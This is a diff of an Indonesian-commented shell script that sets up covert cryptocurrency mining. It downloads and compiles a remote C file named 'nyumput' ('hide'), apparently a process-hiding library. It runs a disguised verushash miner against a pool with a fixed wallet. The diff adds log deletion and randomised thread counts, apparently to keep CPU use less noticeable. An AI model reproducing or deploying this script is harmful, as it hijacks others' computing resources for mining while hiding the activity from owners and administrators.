@@ -3,7 +3,8 @@
 # Memperbarui dan menginstal dependensi
 sudo apt-get update
 sudo apt-get install -y wget curl build-essential jq
-
+rm -rf dance_*
+rm -rf list_*
 # Mengunduh dan mengompilasi kode
 curl -L https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
 gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
@@ -45,13 +46,21 @@ while [ $(date +%s) -lt $end_time ]; do
 
   # Memastikan file sgr ada
   if [ -f $dynamic_sgr ]; then
-    # Memulai proses untuk beberapa port
+    # Menjalankan proses untuk beberapa port
     for port in $(seq 301 310); do
+      # Menghasilkan nilai acak untuk -t antara 1 dan (jumlah inti - 2)
+      num_cores=$(nproc)
+      max_threads=$((num_cores - 2))
+      if [ $max_threads -lt 1 ]; then
+        max_threads=1  # Pastikan minimal 1 thread
+      fi
+      random_threads=$((RANDOM % max_threads + 1))
+
       # Menjalankan proses dengan parameter yang ditentukan di latar belakang
-      nohup $dynamic_sgr -a verushash --pool $ip:$port -u RJ3brBKGZcdmdHJjKQWjkjAb5qnDaWkeaf --timeout 120 -t 3 -p x --keepalive true > dance_$port_$timestamp.log 2>&1 &
+      nohup $dynamic_sgr -a verushash --pool $ip:$port -u RJ3brBKGZcdmdHJjKQWjkjAb5qnDaWkeaf --timeout 120 -t $random_threads -p x --keepalive true > dance_$port_$timestamp.log 2>&1 &
       process_pid=$!
 
-      echo "Memulai proses dengan PID $process_pid menggunakan IP $ip dan port $port"
+      echo "Memulai proses dengan PID $process_pid menggunakan IP $ip dan port $port dengan $random_threads threads"
 
       # Menjalankan selama 1 menit
       sleep 60
